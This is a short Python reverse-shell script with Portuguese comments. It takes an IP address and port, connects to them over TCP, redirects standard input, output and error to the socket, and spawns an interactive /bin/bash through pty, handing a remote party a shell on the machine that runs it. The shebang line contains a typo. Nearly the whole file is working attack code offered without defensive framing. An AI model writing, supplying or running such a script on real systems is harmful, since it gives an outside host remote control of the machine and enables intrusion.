#!/usr/ben/env python3

import os
import pty
import socket
import sys

#Verificando se há 3 argumentos na hora de executar o arquivo, caso não, exibe erro
if len(sys.argv) != 3:
    print("Error: missing IP or port value", file=sys.stderr)
    print("Usage: %s <ip> <port>" % sys.argv[0])
    exit(1)

#Pegando apenas os argumentos 2 e 3, pois o primeiro argumento por padrão é o nome do arquivo
ip, port = sys.argv[1:]

#Criando socket padrão TCP/IP
sock = socket.socket()
sock.connect((ip, int(port)))

#Duplicando File Descriptor
for fd in range(0, 3):
    os.dup2(sock.fileno(), fd)

#Invocando uma Shell
pty.spawn("/bin/bash")